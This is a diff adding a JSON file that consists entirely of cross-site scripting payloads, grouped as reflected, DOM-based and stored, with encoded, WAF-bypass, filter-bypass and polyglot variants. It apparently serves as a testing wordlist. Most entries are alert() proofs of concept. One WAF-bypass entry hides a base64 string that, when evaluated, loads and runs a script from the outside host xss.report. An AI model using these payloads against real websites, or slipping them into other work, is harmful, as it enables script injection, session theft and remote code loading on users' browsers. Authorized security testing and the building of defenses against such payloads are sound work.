@@ -1,0 +1,167 @@
+{
+  "reflected_xss": {
+    "basic": [
+      "<script>alert('XSS')</script>",
+      "<img src=x onerror=alert('XSS')>",
+      "<svg onload=alert('XSS')>",
+      "<iframe src=javascript:alert('XSS')></iframe>",
+      "<body onload=alert('XSS')>",
+      "<input onfocus=alert('XSS') autofocus>",
+      "<select onfocus=alert('XSS') autofocus>",
+      "<textarea onfocus=alert('XSS') autofocus>",
+      "<details open ontoggle=alert('XSS')>",
+      "<marquee onstart=alert('XSS')>",
+      "javascript:alert('XSS')",
+      "<object data=javascript:alert('XSS')>",
+      "<embed src=javascript:alert('XSS')>",
+      "<video><source onerror=alert('XSS')>",
+      "<audio src=x onerror=alert('XSS')>",
+      "<style>@import'javascript:alert(`XSS`)';</style>",
+      "<link rel=stylesheet href=javascript:alert('XSS')>",
+      "<meta http-equiv=refresh content=0;javascript:alert('XSS')>",
+      "<form><button formaction=javascript:alert('XSS')>",
+      "<table background=javascript:alert('XSS')>"
+    ],
+    "encoded": [
+      "%3Cscript%3Ealert('XSS')%3C/script%3E",
+      "&#60;script&#62;alert('XSS')&#60;/script&#62;",
+      "&lt;script&gt;alert('XSS')&lt;/script&gt;",
+      "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
+      "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
+      "%253Cscript%253Ealert('XSS')%253C/script%253E",
+      "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E",
+      "%2527%253E%253Cscript%253Ealert('XSS')%253C/script%253E",
+      "\\x22\\x3e\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
+      "%22%3E%3Cscript%3Ealert('XSS')%3C/script%3E"
+    ],
+    "attribute_based": [
+      "\" onmouseover=\"alert('XSS')\"",
+      "' onmouseover='alert(\"XSS\")'",
+      "\" autofocus onfocus=\"alert('XSS')\"",
+      "' autofocus onfocus='alert(\"XSS\")'",
+      "\" onclick=\"alert('XSS')\"",
+      "' onclick='alert(\"XSS\")'",
+      "\"><script>alert('XSS')</script>",
+      "'><script>alert('XSS')</script>",
+      "\" onload=\"alert('XSS')\"",
+      "' onload='alert(\"XSS\")'"
+    ],
+    "waf_bypass": [
+      "<ScRiPt>alert('XSS')</ScRiPt>",
+      "<script>al\\u0065rt('XSS')</script>",
+      "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
+      "<img/src=x/onerror=alert('XSS')>",
+      "<svg/onload=alert('XSS')>",
+      "<iframe//src=javascript:alert('XSS')>",
+      "'-alert('XSS')-'",
+      "\";alert('XSS');//",
+      "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert('XSS')//'>",
+      "<img src=\"x\" onerror=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041\">",
+      "<svg><script>alert&#40;'XSS'&#41;</script>",
+      "<img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jLmpzIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw== onload=eval(atob(this.id))>",
+      "<details ontoggle=alert('XSS')>",
+      "<img src=x onerror=alert('XSS') style=display:none>",
+      "<svg onload=alert('XSS') style=display:none>"
+    ],
+    "polyglot": [
+      "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert('XSS')//'>",
+      "\";alert('XSS');//",
+      "'';!--\"<XSS>=&{()}",
+      "<img src=x onerror=alert('XSS')//",
+      "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//\\x3e",
+      "'\"();!--<XSS>=&{()}",
+      "<>\"'><img src=x onerror=alert('XSS')>",
+      "<<SCRIPT>alert('XSS');//<</SCRIPT>",
+      "<IMG SRC=\"javascript:alert('XSS');\">",
+      "'\"><script>alert('XSS')</script>"
+    ],
+    "filter_bypass": [
+      "<script>aler\\u0074('XSS')</script>",
+      "<script>eval('\\x61lert\\x28\\x27XSS\\x27\\x29')</script>",
+      "<script>window['ale'+'rt']('XSS')</script>",
+      "<script>top['al\\x65rt']('XSS')</script>",
+      "<script>al\\x65rt('XSS')</script>",
+      "<script>al\\u0065rt('XSS')</script>",
+      "<script>top[/al/.source+/ert/.source]('XSS')</script>",
+      "<script>top[8680439..toString(30)]('XSS')</script>",
+      "<script>top[8680439.0.toString(30)]('XSS')</script>",
+      "<script>alert(/XSS/)</script>"
+    ]
+  },
+  "dom_xss": {
+    "basic": [
+      "<script>alert('DOM-XSS')</script>",
+      "<img src=x onerror=alert('DOM-XSS')>",
+      "<svg onload=alert('DOM-XSS')>",
+      "<iframe src=javascript:alert('DOM-XSS')></iframe>",
+      "<body onload=alert('DOM-XSS')>",
+      "<input onfocus=alert('DOM-XSS') autofocus>",
+      "<details open ontoggle=alert('DOM-XSS')>",
+      "<marquee onstart=alert('DOM-XSS')>",
+      "javascript:alert('DOM-XSS')",
+      "<object data=javascript:alert('DOM-XSS')>"
+    ],
+    "hash_based": [
+      "#<script>alert('DOM-XSS')</script>",
+      "#<img src=x onerror=alert('DOM-XSS')>",
+      "#<svg onload=alert('DOM-XSS')>",
+      "#javascript:alert('DOM-XSS')",
+      "#' onload=alert('DOM-XSS') x='",
+      "#\" onload=\"alert('DOM-XSS')\" x=\"",
+      "#</script><script>alert('DOM-XSS')</script>",
+      "#'><script>alert('DOM-XSS')</script>",
+      "#\"><script>alert('DOM-XSS')</script>",
+      "#--><script>alert('DOM-XSS')</script>"
+    ],
+    "url_based": [
+      "javascript:alert('DOM-XSS')",
+      "data:text/html,<script>alert('DOM-XSS')</script>",
+      "vbscript:msgbox('DOM-XSS')",
+      "livescript:alert('DOM-XSS')",
+      "view-source:javascript:alert('DOM-XSS')",
+      "javascript://www.google.com%0Aalert('DOM-XSS')",
+      "javascript://%0Aalert('DOM-XSS')",
+      "javascript:void(0);alert('DOM-XSS')",
+      "javascript:/**/alert('DOM-XSS')",
+      "javascript:alert('DOM-XSS');//"
+    ],
+    "encoded_dom": [
+      "%3Cscript%3Ealert('DOM-XSS')%3C/script%3E",
+      "\\x3cscript\\x3ealert('DOM-XSS')\\x3c/script\\x3e",
+      "\\u003cscript\\u003ealert('DOM-XSS')\\u003c/script\\u003e",
+      "%253Cscript%253Ealert('DOM-XSS')%253C/script%253E",
+      "&#x3C;script&#x3E;alert('DOM-XSS')&#x3C;/script&#x3E",
+      "&#60;script&#62;alert('DOM-XSS')&#60;/script&#62;",
+      "&lt;script&gt;alert('DOM-XSS')&lt;/script&gt;",
+      "%2527%253E%253Cscript%253Ealert('DOM-XSS')%253C/script%253E",
+      "\\x22\\x3e\\x3cscript\\x3ealert('DOM-XSS')\\x3c/script\\x3e",
+      "%22%3E%3Cscript%3Ealert('DOM-XSS')%3C/script%3E"
+    ]
+  },
+  "stored_xss": {
+    "basic": [
+      "<script>alert('Stored-XSS')</script>",
+      "<img src=x onerror=alert('Stored-XSS')>",
+      "<svg onload=alert('Stored-XSS')>",
+      "<iframe src=javascript:alert('Stored-XSS')></iframe>",
+      "<body onload=alert('Stored-XSS')>",
+      "<input onfocus=alert('Stored-XSS') autofocus>",
+      "<details open ontoggle=alert('Stored-XSS')>",
+      "javascript:alert('Stored-XSS')",
+      "<object data=javascript:alert('Stored-XSS')>",
+      "<embed src=javascript:alert('Stored-XSS')>"
+    ],
+    "persistent": [
+      "<script>setInterval(function(){alert('Stored-XSS')},5000)</script>",
+      "<img src=x onerror=\"this.onerror=null;alert('Stored-XSS')\">",
+      "<svg onload=\"alert('Stored-XSS');this.remove()\">",
+      "<iframe src=\"data:text/html,<script>alert('Stored-XSS')</script>\">",
+      "<meta http-equiv=refresh content=1;javascript:alert('Stored-XSS')>",
+      "<link rel=stylesheet href=javascript:alert('Stored-XSS')>",
+      "<style>@import'javascript:alert(`Stored-XSS`)';</style>",
+      "<table background=javascript:alert('Stored-XSS')>",
+      "<form><button formaction=javascript:alert('Stored-XSS')>",
+      "<video><source onerror=alert('Stored-XSS')>"
+    ]
+  }
+}
